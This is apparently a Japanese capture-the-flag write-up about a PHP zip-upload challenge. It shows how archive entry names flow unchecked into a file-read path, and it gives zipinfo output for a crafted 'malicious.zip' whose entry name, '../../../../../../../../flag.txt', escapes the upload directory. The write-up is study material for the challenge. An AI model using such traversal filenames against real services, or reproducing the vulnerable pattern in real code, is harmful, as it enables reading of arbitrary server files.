# Writeup

`index.php` のこのあたりを見ると、Directory Traversal がありそうである。

```php
// return file if filename parameter is passed
if (isset($_GET["filename"]) && is_string(($_GET["filename"]))) {
    if (in_array($_GET["filename"], $_SESSION["files"], TRUE)) {
        $filepath = $user_dir . "/" . $_GET["filename"];
        header("Content-Type: text/plain");
        echo file_get_contents($filepath);
        die();
    } else {
        echo "no such file";
        die();
    }
}
```

この Directory Traversal らしき箇所は、`in_array($_GET["filename"], $_SESSION["files"], TRUE)` を満たしつつ、`$_GET["filename"]` に悪意のある文字列を入れられるなら利用できる。

ところでこの `$_SESSION["files"]` は、次のようにして生成されているのであった。

```php
    // try to open uploaded file as zip
    $zip = new ZipArchive;
    if ($zip->open($_FILES["file"]["tmp_name"]) !== TRUE) {
        echo "failed to open your zip.";
        die();
    }

    /* 省略 */

    // add files to $_SESSION["files"]
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $s = $zip->statIndex($i);
        $_SESSION["files"][] = $s["name"];
    }
```    

つまりアップロードした .zip アーカイブ中のファイル名がそのまま使われているのである。
いま .zip アーカイブ中のファイル名には `../` のような文字列を入れられる。これは次のようなコマンドの実行結果から明らかである。
したがってこのような悪意のある .zip アーカイブをよしなに生成し、それをアップロードすれば、任意パスのファイルを読み出すことができる。

```sh
$ zipinfo -l solver/malicious.zip
Archive:  solver/malicious.zip
Zip file size: 162 bytes, number of entries: 1
-rw-r--r--  2.0 unx        0 b-        0 stor 20-Apr-24 00:58 ../../../../../../../../flag.txt
1 file, 0 bytes uncompressed, 0 bytes compressed:  0.0%
```